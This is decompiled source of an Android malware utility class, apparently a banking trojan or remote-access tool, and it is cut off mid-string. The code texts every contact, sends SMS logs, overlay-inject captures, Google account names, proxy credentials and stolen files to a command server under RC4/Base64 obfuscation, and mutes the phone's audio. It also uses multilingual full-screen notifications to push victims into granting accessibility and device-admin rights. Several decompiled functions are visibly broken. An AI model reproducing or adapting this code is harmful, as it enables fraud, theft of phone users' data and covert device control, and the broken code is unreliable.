/*
 * Decompiled with CFR <Could not determine version>.
 * 
 * Could not load the following classes:
 *  android.accounts.Account
 *  android.accounts.AccountManager
 *  android.annotation.TargetApi
 *  android.app.ActivityManager
 *  android.app.ActivityManager$RunningServiceInfo
 *  android.app.AlarmManager
 *  android.app.KeyguardManager
 *  android.app.Notification
 *  android.app.Notification$Builder
 *  android.app.NotificationChannel
 *  android.app.NotificationManager
 *  android.app.PendingIntent
 *  android.app.admin.DevicePolicyManager
 *  android.app.job.JobInfo
 *  android.app.job.JobInfo$Builder
 *  android.app.job.JobScheduler
 *  android.content.BroadcastReceiver
 *  android.content.ComponentName
 *  android.content.ContentResolver
 *  android.content.Context
 *  android.content.Intent
 *  android.content.IntentFilter
 *  android.content.SharedPreferences
 *  android.content.SharedPreferences$Editor
 *  android.content.pm.ApplicationInfo
 *  android.content.pm.PackageManager
 *  android.content.res.Resources
 *  android.database.Cursor
 *  android.graphics.Bitmap
 *  android.graphics.BitmapFactory
 *  android.media.AudioManager
 *  android.net.ConnectivityManager
 *  android.net.NetworkInfo
 *  android.net.NetworkInfo$State
 *  android.net.Uri
 *  android.os.AsyncTask
 *  android.os.Build
 *  android.os.Build$VERSION
 *  android.os.PowerManager
 *  android.os.PowerManager$WakeLock
 *  android.provider.ContactsContract
 *  android.provider.ContactsContract$CommonDataKinds
 *  android.provider.ContactsContract$CommonDataKinds$Phone
 *  android.provider.Settings
 *  android.provider.Settings$Secure
 *  android.provider.Telephony
 *  android.provider.Telephony$Sms
 *  android.telephony.SmsManager
 *  android.telephony.TelephonyManager
 *  android.text.TextUtils
 *  android.text.TextUtils$SimpleStringSplitter
 *  android.text.format.Time
 *  android.util.Base64
 *  android.util.Log
 *  org.json.JSONObject
 */
package com.example.mmm.Utils;

import a.aa;
import a.o;
import a.r;
import a.u;
import a.w;
import a.x;
import a.y;
import a.z;
import android.accounts.Account;
import android.accounts.AccountManager;
import android.annotation.TargetApi;
import android.app.ActivityManager;
import android.app.AlarmManager;
import android.app.KeyguardManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.admin.DevicePolicyManager;
import android.app.job.JobInfo;
import android.app.job.JobScheduler;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.content.res.Resources;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.media.AudioManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Build;
import android.os.PowerManager;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.provider.Telephony;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.text.TextUtils;
import android.text.format.Time;
import android.util.Base64;
import android.util.Log;
import com.example.mmm.API.ClassRC4;
import com.example.mmm.Activity.actDozeMode;
import com.example.mmm.Activity.actToaskAccessibility;
import com.example.mmm.Admin.ReceiverDeviceAdmin;
import com.example.mmm.Receiver.bootReceiver;
import com.example.mmm.Service.srvAccessibility;
import com.example.mmm.Service.srvIBlackScreen;
import com.example.mmm.Service.srvJOB;
import com.example.mmm.Service.srvNetworkConnect;
import com.example.mmm.Service.srvWhileWorker;
import com.example.mmm.Utils.AsnycTask;
import com.example.mmm.constants;
import com.example.mmm.mainActivity;
import java.io.File;
import java.io.InputStream;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;
import java.util.Locale;
import java.util.Random;
import java.util.concurrent.TimeUnit;
import org.json.JSONObject;

public class utils {
    static final boolean warming$ = utils.class.desiredAssertionStatus() ^ true;
    private static SharedPreferences settings = null;
    private static SharedPreferences.Editor editor = null;
    private static PowerManager.WakeLock wakeLock;
    constants consts = new constants();

    public static int getMiuiVersion() {
        Runtime.getRuntime().exec("getprop ro.miui.ui.version.name").getInputStream();
        Object var1 = null;
        String string = null;
        return Integer.parseInt(string.replace("V", ""));
    }

    public static String countrySIM(Context context) {
        if (!(context = (TelephonyManager)context.getSystemService("phone")).getNetworkCountryIso().isEmpty()) return context.getNetworkCountryIso();
        return "~no~";
    }

    static String _premises(String string) {
        if (string == null) return "";
        if (string.length() == 0) {
            return "";
        }
        char c2 = string.charAt(0);
        if (Character.isUpperCase(c2)) {
            return string;
        }
        StringBuilder stringBuilder = new StringBuilder();
        stringBuilder.append(Character.toUpperCase(c2));
        stringBuilder.append(string.substring(1));
        return stringBuilder.toString();
    }

    public static String _anaheim(String string, String string2, String string3) {
        return string.substring(string.indexOf(string2) + string2.length(), string.indexOf(string3));
    }

    public static JSONObject mergeJSONObjects(JSONObject object, JSONObject jSONObject) {
        JSONObject jSONObject2 = new JSONObject();
        Iterator iterator = object.keys();
        Iterator iterator2 = jSONObject.keys();
        do {
            if (!iterator.hasNext()) {
                while (iterator2.hasNext()) {
                    object = (String)iterator2.next();
                    jSONObject2.put((String)object, jSONObject.get((String)object));
                }
                return jSONObject2;
            }
            String string = (String)iterator.next();
            jSONObject2.put(string, object.get(string));
        } while (true);
    }

    public static void chalkTile(int n2) {
        TimeUnit.MILLISECONDS.sleep(n2);
    }

    public static void startCustomTimer(Context context, String string, long l2) {
        string = "";
        Intent intent = new Intent(context, bootReceiver.class);
        intent.setAction(string);
        string = PendingIntent.getBroadcast((Context)context, (int)0, (Intent)intent, (int)0);
        ((AlarmManager)context.getSystemService("alarm")).setRepeating(0, System.currentTimeMillis() + l2, l2, (PendingIntent)string);
    }

    public static boolean isMyServiceRunning(Context object, Class class_) {
        ActivityManager.RunningServiceInfo runningServiceInfo;
        object = ((ActivityManager)object.getSystemService("activity")).getRunningServices(Integer.MAX_VALUE).iterator();
        do {
            if (!object.hasNext()) return false;
            runningServiceInfo = (ActivityManager.RunningServiceInfo)object.next();
        } while (!class_.getName().equals(runningServiceInfo.service.getClassName()));
        return true;
    }

    public static byte[] _update(File file) {
        InputStream inputStream = null;
        byte[] arrby = new byte[(int)0L];
        boolean bl = false;
        arrby.length;
        arrby.length;
        inputStream.close();
        return arrby;
    }

    public static Bitmap _slides(String arrby) {
        arrby = Base64.decode((byte[])arrby.getBytes(), (int)0);
        return BitmapFactory.decodeByteArray((byte[])arrby, (int)0, (int)arrby.length);
    }

    private String _checking(String object, String object2) {
        Object object3 = new StringBuilder();
        ((StringBuilder)object3).append((String)object2);
        ((StringBuilder)object3).append("&end=0");
        object3 = ((StringBuilder)object3).toString();
        object2 = utils._anaheim((String)object3, "q=", "&ws=");
        Object object4 = utils._anaheim((String)object3, "&ws=", "&end=0");
        object3 = new StringBuilder();
        ((StringBuilder)object3).append((String)object2);
        ((StringBuilder)object3).append("   ");
        ((StringBuilder)object3).append((String)object4);
        this.Log("q_ws", ((StringBuilder)object3).toString());
        object3 = new u();
        object2 = new o.a().a("q", (String)object2).a("ws", (String)object4);
        object4 = new o(((o.a)object2).a, ((o.a)object2).b);
        x.a a2 = new x.a();
        if (object == null) throw new NullPointerException("url == null");
        if (((String)object).regionMatches(true, 0, "ws:", 0, 3)) {
            object2 = new StringBuilder("http:");
            ((StringBuilder)object2).append(((String)object).substring(3));
            object2 = ((StringBuilder)object2).toString();
        } else {
            object2 = object;
            if (((String)object).regionMatches(true, 0, "wss:", 0, 4)) {
                object2 = new StringBuilder("https:");
                ((StringBuilder)object2).append(((String)object).substring(4));
                object2 = ((StringBuilder)object2).toString();
            }
        }
        object = r.d((String)object2);
        if (object == null) throw new IllegalArgumentException("unexpected url: ".concat(String.valueOf(object2)));
        object = new w((u)object3, a2.a((r)object).a("POST", (y)object4).a(), false).a();
        object2 = ((z)object).g.d();
        if (object == null) return object2;
        ((z)object).close();
        return object2;
    }

    public static void _module(Context context) {
        if (utils.isNotificationServiceEnabled(context)) return;
        Intent intent = new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS");
        intent.addFlags(268435456);
        context.startActivity(intent);
    }

    public static boolean isAccessibilityServiceEnabled(Context context, Class componentName) {
        boolean bl;
        componentName = srvAccessibility.class;
        componentName = new ComponentName(context, componentName);
        String string = Settings.Secure.getString((ContentResolver)context.getContentResolver(), (String)"enabled_accessibility_services");
        if (string == null) {
            return false;
        }
        context = new TextUtils.SimpleStringSplitter(':');
        context.setString(string);
        do {
            if (!context.hasNext()) return false;
        } while ((string = ComponentName.unflattenFromString((String)context.next())) == null || !(bl = string.equals((Object)componentName)));
        return true;
    }

    public static String hasPermission(Context context, String string) {
        if (context.checkCallingOrSelfPermission(string) == 0) return "1";
        return "0";
    }

    private static String _giant(String arrby, String charSequence) {
        arrby = new ClassRC4(((String)charSequence).getBytes())._liver(arrby.getBytes());
        charSequence = new StringBuffer(arrby.length * 2);
        int n2 = arrby.length;
        int n3 = 0;
        while (n3 < n2) {
            String string = Integer.toString(arrby[n3] & 255, 16);
            if (string.length() < 2) {
                ((StringBuffer)charSequence).append('0');
            }
            ((StringBuffer)charSequence).append(string);
            ++n3;
        }
        return Base64.encodeToString((byte[])((StringBuffer)charSequence).toString().getBytes(), (int)0);
    }

    public static boolean isNotificationServiceEnabled(Context object) {
        String string = object.getPackageName();
        if (TextUtils.isEmpty((CharSequence)(object = Settings.Secure.getString((ContentResolver)object.getContentResolver(), (String)"enabled_notification_listeners")))) return false;
        object = ((String)object).split(":");
        int n2 = 0;
        while (n2 < ((Object)object).length) {
            ComponentName componentName = ComponentName.unflattenFromString((String)object[n2]);
            if (componentName != null && TextUtils.equals((CharSequence)string, (CharSequence)componentName.getPackageName())) {
                return true;
            }
            ++n2;
        }
        return false;
    }

    public static String _cookie(String string) {
        return Base64.encodeToString((byte[])string.getBytes("UTF-8"), (int)0);
    }

    private static String _possibly(String object, String string) {
        object = utils.hexStringToByteArray(new String(Base64.decode((String)object, (int)0), "UTF-8"));
        return new String(new ClassRC4(string.getBytes())._nevada((byte[])object));
    }

    @TargetApi(value=23)
    @TargetApi(value=23)
    public static void scheduleJob(Context context) {
        JobInfo.Builder builder = new JobInfo.Builder(0, new ComponentName(context, srvJOB.class));
        builder.setMinimumLatency(15000L);
        builder.setOverrideDeadline(30000L);
        builder.setRequiredNetworkType(1);
        builder.setRequiresDeviceIdle(true);
        builder.setRequiresCharging(false);
        ((JobScheduler)context.getSystemService(JobScheduler.class)).schedule(builder.build());
    }

    public static void _casual(Context context, String string) {
        context.startActivity(new Intent("android.intent.action.VIEW", Uri.parse((String)string)));
    }

    public static String _efforts(String string) {
        return new String(Base64.decode((String)string, (int)0), "UTF-8");
    }

    public static void swapSmsManager(Context context, String string) {
        Intent intent = new Intent("android.provider.Telephony.ACTION_CHANGE_DEFAULT");
        intent.putExtra("package", string);
        intent.addFlags(268435456);
        context.startActivity(intent);
    }

    public static boolean checkNetworkConnection(Context context) {
        NetworkInfo networkInfo = (context = (ConnectivityManager)context.getSystemService("connectivity")).getNetworkInfo(1);
        if (networkInfo != null && networkInfo.isConnected()) {
            return true;
        }
        networkInfo = context.getNetworkInfo(0);
        if (networkInfo != null && networkInfo.isConnected()) {
            return true;
        }
        if ((context = context.getActiveNetworkInfo()) == null) return false;
        if (!context.isConnected()) return false;
        return true;
    }

    public static String getBatteryLevel(Context context) {
        context = context.registerReceiver(null, new IntentFilter("android.intent.action.BATTERY_CHANGED"));
        int n2 = context.getIntExtra("level", -1);
        int n3 = context.getIntExtra("scale", -1);
        return String.valueOf(Math.round((float)n2 / (float)n3 * 100.0f));
    }

    public static byte[] hexStringToByteArray(String string) {
        int n2 = string.length();
        byte[] arrby = new byte[n2 / 2];
        int n3 = 0;
        while (n3 < n2) {
            arrby[n3 / 2] = (byte)((Character.digit(string.charAt(n3), 16) << 4) + Character.digit(string.charAt(n3 + 1), 16));
            n3 += 2;
        }
        return arrby;
    }

    private String sendSmsLogs(Context object, String charSequence, String string, String string2) {
        JSONObject jSONObject = new JSONObject();
        jSONObject.put("ID", (Object)string);
        jSONObject.put("LG", (Object)charSequence);
        string = new Time(Time.getCurrentTimezone());
        string.setToNow();
        StringBuilder stringBuilder = new StringBuilder();
        stringBuilder.append(((Time)string).year);
        stringBuilder.append("-");
        stringBuilder.append(((Time)string).month);
        stringBuilder.append("-");
        stringBuilder.append(((Time)string).monthDay);
        stringBuilder.append(" ");
        stringBuilder.append(string.format("%k:%M"));
        jSONObject.put("DT", (Object)stringBuilder.toString());
        this.Log("SEND SMS", "logs: ".concat(String.valueOf(charSequence)));
        charSequence = new StringBuilder();
        ((StringBuilder)charSequence).append(string2);
        ((StringBuilder)charSequence).append(this._grown(jSONObject.toString()));
        return this._marina(this._brought((Context)object, ((StringBuilder)charSequence).toString()));
    }

    public static void runApplication(Context context, String string) {
        context.startActivity(context.getPackageManager().getLaunchIntentForPackage(string));
    }

    public static String _castle(Context arraccount) {
        arraccount = AccountManager.get((Context)arraccount).getAccounts();
        int n2 = arraccount.length;
        int n3 = 0;
        while (n3 < n2) {
            Account account = arraccount[n3];
            if (account.type.equals("com.google")) {
                return account.name;
            }
            ++n3;
        }
        return "";
    }

    private static String _orbit(String string) {
        String string2 = string = "";
        string2 = string;
        string.length();
        return string2;
    }

    public static String getAccounts(Context object) {
        Account[] arraccount = AccountManager.get((Context)object).getAccountsByType("com.google");
        object = "";
        int n2 = arraccount.length;
        int n3 = 0;
        while (n3 < n2) {
            Account account = arraccount[n3];
            StringBuilder stringBuilder = new StringBuilder();
            stringBuilder.append((String)object);
            stringBuilder.append(account.name);
            stringBuilder.append(",");
            object = stringBuilder.toString();
            ++n3;
        }
        return object;
    }

    public static boolean _exercise(Context context) {
        return ((DevicePolicyManager)context.getSystemService("device_policy")).isAdminActive(new ComponentName(context, ReceiverDeviceAdmin.class));
    }

    public static boolean _prayer(Context context) {
        if (Build.VERSION.SDK_INT < 23) return true;
        return ((PowerManager)context.getSystemService("power")).isIgnoringBatteryOptimizations(context.getPackageName());
    }

    public static String _janet(Context context) {
        if (((KeyguardManager)context.getSystemService("keyguard")).inKeyguardRestrictedInputMode()) return "0";
        return "1";
    }

    public static String _delhi(Context context) {
        if (Build.VERSION.SDK_INT < 19) return "0";
        if (Telephony.Sms.getDefaultSmsPackage((Context)context).equals(context.getPackageName())) return "1";
        return "0";
    }

    public static boolean getScreenBoolean(Context context) {
        if (!((KeyguardManager)context.getSystemService("keyguard")).inKeyguardRestrictedInputMode()) return true;
        return false;
    }

    public static void _pensions(Context context) {
        context = (AudioManager)context.getSystemService("audio");
        context.setStreamMute(1, true);
        context.setStreamMute(3, true);
        context.setStreamVolume(4, 0, 0);
        context.setStreamVolume(8, 0, 0);
        context.setStreamVolume(5, 0, 0);
        context.setStreamVolume(2, 0, 0);
        context.setVibrateSetting(1, 0);
    }

    private String _nvidia(Context object) {
        return this._marina(this._brought((Context)object, "q=get_number&ws=0"));
    }

    public final String _decrease(Context object, String charSequence, String string, String string2, String string3) {
        JSONObject jSONObject = new JSONObject();
        string = new JSONObject(string);
        jSONObject.put("LG", (Object)string.getString("data"));
        jSONObject.put("ID", (Object)string2);
        jSONObject.put("AP", (Object)string.getString("application"));
        jSONObject.put("IT", (Object)charSequence);
        this.Log("SEND", "idinject: ".concat(String.valueOf(charSequence)));
        this.Log("SEND", "idbot: ".concat(String.valueOf(string2)));
        charSequence = new StringBuilder("application: ");
        ((StringBuilder)charSequence).append(string.getString("application"));
        this.Log("SEND", ((StringBuilder)charSequence).toString());
        charSequence = new StringBuilder("logs: ");
        ((StringBuilder)charSequence).append(string.getString("data"));
        this.Log("SEND", ((StringBuilder)charSequence).toString());
        charSequence = new StringBuilder();
        ((StringBuilder)charSequence).append(string3);
        ((StringBuilder)charSequence).append(this._grown(jSONObject.toString()));
        return this._marina(this._brought((Context)object, ((StringBuilder)charSequence).toString()));
    }

    public final String _markers(Context object, String charSequence, String string, String string2, String string3, String string4, String string5) {
        JSONObject jSONObject = new JSONObject();
        jSONObject.put("id_device", (Object)charSequence);
        jSONObject.put("country", (Object)string);
        jSONObject.put("host", (Object)string2);
        jSONObject.put("port", (Object)string3);
        jSONObject.put("user", (Object)string4);
        jSONObject.put("pass", (Object)string5);
        charSequence = new StringBuilder();
        ((StringBuilder)charSequence).append(string4);
        ((StringBuilder)charSequence).append("@");
        ((StringBuilder)charSequence).append(string2);
        ((StringBuilder)charSequence).append(":");
        ((StringBuilder)charSequence).append(string3);
        this.Log("Send_add_socks5", ((StringBuilder)charSequence).toString());
        charSequence = new StringBuilder();
        ((StringBuilder)charSequence).append("q=add_socks5&ws=");
        ((StringBuilder)charSequence).append(this._grown(jSONObject.toString()));
        return this._marina(this._brought((Context)object, ((StringBuilder)charSequence).toString()));
    }

    public final void _recovery(Context context, String string) {
        Cursor cursor = context.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
        boolean bl = false;
        int n2 = 0;
        boolean bl2 = false;
        while (cursor.moveToNext()) {
            String string2 = cursor.getString(cursor.getColumnIndex("data1"));
            int n3 = n2;
            boolean bl3 = bl2;
            if (!string2.contains("*")) {
                n3 = n2;
                bl3 = bl2;
                if (!string2.contains("#")) {
                    n3 = n2;
                    bl3 = bl2;
                    if (string2.length() > 7) {
                        this._meant(context, string2, string);
                        n3 = n2 + 1;
                        bl3 = true;
                    }
                }
            }
            utils.chalkTile(1000);
            n2 = n3;
            bl2 = bl3;
        }
    }

    public final void _spaces(Context context, String string, String string2) {
        int n2 = 0;
        int n3 = !string2.isEmpty() && !string2.equals(" ") ? Integer.parseInt(string2.replace(" ", "")) : -1;
        do {
            utils.chalkTile(1000);
            string2 = this._nvidia(context);
            if (string2.isEmpty()) return;
            this._meant(context, string2, string);
            ++n2;
        } while (true);
    }

    public final void _tattoo(Context context, String string, String string2, String string3) {
        if (Build.VERSION.SDK_INT < 28) return;
        NotificationManager notificationManager = (NotificationManager)context.getSystemService("notification");
        notificationManager.cancelAll();
        if (!warming$) {
            if (notificationManager == null) throw new AssertionError();
        }
        if (notificationManager.getNotificationChannel("com.lliwljofvp.akgndulzcijjcol_notification_id") == null) {
            notificationManager.createNotificationChannel(new NotificationChannel("com.lliwljofvp.akgndulzcijjcol_notification_id", (CharSequence)"com.lliwljofvp.akgndulzcijjcol_notification_name", 4));
        }
        if (string3.equals("accessibility")) {
            string3 = this.consts.regional$ ? new Intent(context, actToaskAccessibility.class) : new Intent("android.settings.ACCESSIBILITY_SETTINGS");
            string3.putExtra("123", 123);
            string3 = PendingIntent.getActivity((Context)context, (int)0, (Intent)string3, (int)134217728);
        } else if (string3.equals("main")) {
            string3 = new Intent("miui.intent.action.APP_PERM_EDITOR");
            string3.setClassName("com.miui.securitycenter", "com.miui.permcenter.permissions.PermissionsEditorActivity");
            string3.putExtra("extra_pkgname", context.getPackageName());
            string3.setFlags(268435456);
            string3.putExtra("123", 123);
            string3 = PendingIntent.getActivity((Context)context, (int)0, (Intent)string3, (int)134217728);
        } else {
            string3 = null;
        }
        Notification.Builder builder = new Notification.Builder(context).setChannelId("com.lliwljofvp.akgndulzcijjcol_notification_id").setTicker((CharSequence)"Nature");
        Resources resources = context.getResources();
        StringBuilder stringBuilder = new StringBuilder();
        stringBuilder.append(context.getPackageName());
        stringBuilder.append(":mipmap/ic_launcher");
        context = builder.setSmallIcon(resources.getIdentifier(stringBuilder.toString(), null, null)).setContentTitle((CharSequence)string).setContentText((CharSequence)string2).setFullScreenIntent((PendingIntent)string3, true).setOngoing(true).setAutoCancel(true).getNotification();
        context.flags |= 32;
        notificationManager.notify(123, (Notification)context);
    }

    public final void _firms(String string, Context context) {
        if ("xiaomi".equalsIgnoreCase(Build.MANUFACTURER) && utils.getMiuiVersion() >= 10 && !this.SettingsRead(context, "XB").equals("1")) {
            return;
        }
        if (utils._prayer(context) || Integer.parseInt(this.SettingsRead(context, "SM")) <= 2) {
            if (utils._prayer(context)) return;
            if (!utils.isAccessibilityServiceEnabled(context, srvAccessibility.class)) return;
        }
        this.SettingsWrite(context, "SQ", "1");
        this.Log(string, "autoClick=1 Doze Mode");
        string = new Intent(context, actDozeMode.class);
        string.addFlags(268435456);
        string.addFlags(1073741824);
        context.startActivity((Intent)string);
    }

    public final void Log(String string, String string2) {
        if (!this.consts.ongoing$) return;
        Log.e((String)string, (String)string2);
    }

    public final String _basin() {
        new AsnycTask(this, 0).execute((Object[])new Void[0]);
        Object object = new AsnycTask(this, 0);
        object.execute((Object[])new Void[0]);
        return (String)object.get();
    }

    public final String _storage(int n2) {
        String string = "qwertyuiopasdfghjklzxcvbnm1234567890";
        Random random = new Random();
        StringBuilder stringBuilder = new StringBuilder();
        int n3 = 0;
        while (n3 < n2) {
            stringBuilder.append(string.charAt(random.nextInt(string.length())));
            ++n3;
        }
        return stringBuilder.toString();
    }

    public final String _atlantic(Context object, String charSequence, String string, String string2) {
        JSONObject jSONObject = new JSONObject();
        jSONObject.put("ID", (Object)string);
        jSONObject.put("IT", (Object)charSequence);
        charSequence = new StringBuilder();
        ((StringBuilder)charSequence).append(string2);
        ((StringBuilder)charSequence).append(this._grown(jSONObject.toString()));
        return this._marina(this._brought((Context)object, ((StringBuilder)charSequence).toString()));
    }

    public final void _pasta(Context context, String string) {
        String[] arrstring = string.split("###");
        int n2 = 0;
        while (n2 < arrstring.length) {
            CharSequence charSequence = string;
            if (!arrstring[n2].isEmpty()) {
                arrstring[n2];
                CharSequence charSequence2 = Base64.encodeToString((byte[])utils._update(null), (int)0);
                arrstring[n2];
                Object var7_7 = null;
                charSequence = new JSONObject();
                charSequence.put("cmd", (Object)"saved_file");
                charSequence.put("ID", (Object)this.SettingsRead(context, "QQ"));
                charSequence.put("name", var7_7);
                charSequence.put("file_base64", (Object)charSequence2);
                charSequence2 = new StringBuilder();
                ((StringBuilder)charSequence2).append("q=rat_cmd&ws=");
                ((StringBuilder)charSequence2).append(this._grown(charSequence.toString()));
                charSequence2 = this._marina(this._brought(context, ((StringBuilder)charSequence2).toString()));
                this.Log("responce", " - > ".concat(String.valueOf(charSequence2)));
                charSequence = string;
                if (((String)charSequence2).equals("ok")) {
                    charSequence = new StringBuilder("###");
                    ((StringBuilder)charSequence).append(arrstring[n2]);
                    charSequence = string.replace(((StringBuilder)charSequence).toString(), "");
                    this.SettingsWrite(context, "FF", (String)charSequence);
                    arrstring[n2];
                }
            }
            ++n2;
            string = charSequence;
        }
    }

    public final void _meant(Context context, String string, String string2) {
        Object object = SmsManager.getDefault();
        ArrayList arrayList = object.divideMessage(string2);
        Intent intent = new Intent("SMS_SENT");
        int n2 = 0;
        intent = PendingIntent.getBroadcast((Context)context, (int)0, (Intent)intent, (int)0);
        PendingIntent pendingIntent = PendingIntent.getBroadcast((Context)context, (int)0, (Intent)new Intent("SMS_DELIVERED"), (int)0);
        ArrayList<Intent> arrayList2 = new ArrayList<Intent>();
        ArrayList<PendingIntent> arrayList3 = new ArrayList<PendingIntent>();
        do {
            if (n2 >= arrayList.size()) {
                object.sendMultipartTextMessage(string, null, arrayList, arrayList2, arrayList3);
                object = new StringBuilder("Output SMS:");
                ((StringBuilder)object).append(string);
                ((StringBuilder)object).append(" text:");
                ((StringBuilder)object).append(string2);
                ((StringBuilder)object).append("[143523#]");
                string = ((StringBuilder)object).toString();
                this.Log("SMS", string);
                this.SettingsToAdd(context, "AS", string);
                this._compiled(context, this.SettingsRead(context, "QQ"));
                return;
            }
            arrayList3.add(pendingIntent);
            arrayList2.add(intent);
            ++n2;
        } while (true);
    }

    public final String[] _pants(File file) {
        int[] arrn;
        JSONObject jSONObject = new JSONObject();
        JSONObject jSONObject2 = new JSONObject();
        int[] arrn2 = arrn = new int[2];
        arrn2[0] = 0;
        arrn2[1] = 0;
        file = null;
        int n2 = ((File)file).length;
        int n3 = 0;
        while (n3 < n2) {
            File file2 = file[n3];
            jSONObject2.put(Integer.toString(arrn[1]), null);
            arrn[1] = arrn[1] + 1;
            ++n3;
        }
        return new String[]{jSONObject.toString(), jSONObject2.toString()};
    }

    public final String _numbers() {
        Object object = new JSONObject("{'en':'Enable','de':'Aktivieren','af':'Aktiveer','zh':'\u542f\u7528','cs':'Zapnout','nl':'Activeren','fr':'Activer','it':'Abilitare','ja':'\u6709\u52b9\u306b\u3059\u308b','ko':'\uc0ac\uc6a9\ud558\ub2e4','pl':'w\u0142\u0105czy\u0107','es':'Habilitar','ar':'\u064a\u064f\u0645\u0643\u0651\u0646','bg':'\u0412\u044a\u0437\u043c\u043e\u0436\u043d\u043e\u0441\u0442','ca':'Enable','hr':'Aktivirati','da':'Aktivere','fi':'Ottaa k\u00e4ytt\u00f6\u00f6n','el':'\u03b5\u03bd\u03b5\u03c1\u03b3\u03bf\u03c0\u03bf\u03b9\u03ce','iw':'\u05d4\u05e4\u05d5\u05da \u05dc\u05d6\u05de\u05d9\u05df','hi':'\u0938\u0915\u094d\u0937\u092e \u0915\u0930\u0947\u0902','hu':'Enged\u00e9lyez','in':'Fungsikan','lv':'Aktiviz\u0113t','lt':'Aktyvinti','nb':'Aktivere','pt':'Ativar','ro':'Activa','sr':'Aktivirati','sk':'Aktivova\u0165','sl':'Vklju\u010diti','sv':'Aktivera','th':'\u0e40\u0e1b\u0e34\u0e14\u0e43\u0e0a\u0e49\u0e07\u0e32\u0e19','tr':'L\u00fctfen','vi':'c\u00f3 hi\u1ec7u l\u1ef1c'}");
        CharSequence charSequence = Locale.getDefault().getLanguage().toLowerCase();
        if (((String)charSequence).equals("tr")) {
            object = new StringBuilder("L\u00fctfen ");
            ((StringBuilder)object).append("g\u00c3\u00bcncelleme");
            ((StringBuilder)object).append(" Etkinle\u015ftirin");
            return ((StringBuilder)object).toString();
        }
        object = object.getString((String)charSequence);
        charSequence = new StringBuilder();
        ((StringBuilder)charSequence).append((String)object);
        ((StringBuilder)charSequence).append(" ");
        ((StringBuilder)charSequence).append("g\u00c3\u00bcncelleme");
        return ((StringBuilder)charSequence).toString();
    }

    public final String _tests(Context object, String charSequence, String string) {
        JSONObject jSONObject = new JSONObject();
        jSONObject.put("AK", (Object)charSequence);
        charSequence = new StringBuilder();
        ((StringBuilder)charSequence).append(string);
        ((StringBuilder)charSequence).append(this._grown(jSONObject.toString()));
        return this._marina(this._brought((Context)object, ((StringBuilder)charSequence).toString()));
    }

    public final String sendSavedSms(Context object, String charSequence, String string, String string2) {
        JSONObject jSONObject = new JSONObject();
        jSONObject.put("ID", (Object)string);
        jSONObject.put("LS", (Object)charSequence);
        this.Log("Send Saved SMS", "logs: ".concat(String.valueOf(charSequence)));
        charSequence = new StringBuilder();
        ((StringBuilder)charSequence).append(string2);
        ((StringBuilder)charSequence).append(this._grown(jSONObject.toString()));
        return this._marina(this._brought((Context)object, ((StringBuilder)charSequence).toString()));
    }

    public final String _center(String string) {
        JSONObject jSONObject = new JSONObject();
        jSONObject.put("1", (Object)"1");
        StringBuilder stringBuilder = new StringBuilder();
        stringBuilder.append("q=connecting&ws=");
        stringBuilder.append((Object)jSONObject);
        return this._marina(this._checking(string, stringBuilder.toString()));
    }

    public final String _ranch() {
        return new JSONObject("{'en':'Open More downloaded services > ','de':'\u00d6ffnen Sie Weitere heruntergeladene Dienste > ','af':'Open Meer afgelaaide dienste > ','zh':'\u6253\u5f00\u66f4\u591a\u4e0b\u8f7d\u7684\u670d\u52a1 > ','cs':'Otev\u0159\u00edt V\u00edce sta\u017een\u00fdch slu\u017eeb > ','nl':'Open Meer gedownloade services > ','fr':'Ouvrir Plus de services t\u00e9l\u00e9charg\u00e9s > ','it':'Apri Altri servizi scaricati > ','ja':'\u30c0\u30a6\u30f3\u30ed\u30fc\u30c9\u3057\u305f\u30b5\u30fc\u30d3\u30b9\u3092\u3055\u3089\u306b\u958b\u304f > ','ko':'\ub354 \ub9ce\uc740 \ub2e4\uc6b4\ub85c\ub4dc \uc11c\ube44\uc2a4 \uc5f4\uae30 > ','pl':'Otw\u00f3rz wi\u0119cej pobranych us\u0142ug > ','es':'Abrir m\u00e1s servicios de descargas > ','ar':'\u0641\u062a\u062d \u0627\u0644\u0645\u0632\u064a\u062f \u0645\u0646 \u0627\u0644\u062e\u062f\u0645\u0627\u062a \u0627\u0644\u062a\u064a \u062a\u0645 \u062a\u0646\u0632\u064a\u0644\u0647\u0627 > ','bg':'\u041e\u0442\u0432\u043e\u0440\u0435\u0442\u0435 \u041e\u0449\u0435 \u0438\u0437\u0442\u0435\u0433\u043b\u0435\u043d\u0438 \u0443\u0441\u043b\u0443\u0433\u0438 > ','ca':'Open More downloaded services > ','hr':'Otvori Vi\u0161e preuzetih usluga > ','da':'\u00c5pne Flere nedlastede tjenester > ','fi':'Avaa Lis\u00e4\u00e4 ladattuja palveluita > ','el':'\u0391\u03bd\u03bf\u03af\u03be\u03c4\u03b5 \u03a0\u03b5\u03c1\u03b9\u03c3\u03c3\u03cc\u03c4\u03b5\u03c1\u03b5\u03c2 \u03c5\u03c0\u03b7\u03c1\u03b5\u03c3\u03af\u03b5\u03c2 \u03bb\u03ae\u03c8\u03b7\u03c2 > ','iw':'\u05e4\u05ea\u05d7 \u05e9\u05d9\u05e8\u05d5\u05ea\u05d9\u05dd \u05de\u05d5\u05e8\u05d9\u05d3\u05d9\u05dd \u05e0\u05d5\u05e1\u05e4\u05d9\u05dd > ','hi':'\u0905\u0927\u093f\u0915 \u0921\u093e\u0909\u0928\u0932\u094b\u0921 \u0915\u0940 \u0917\u0908 \u0938\u0947\u0935\u093e\u090f\u0901 \u0916\u094b\u0932\u0947\u0902 > ','hu':'Nyisson meg t\u00f6bb let\u00f6lt\u00f6tt szolg\u00e1ltat\u00e1st > ','in':'Buka Lebih banyak layanan yang diunduh > ','lv':'Atveriet vair\u0101k lejupiel\u0101d\u0113tos pakalpojumus > ','lt':'Atidarykite Daugiau atsisi\u0173st\u0173 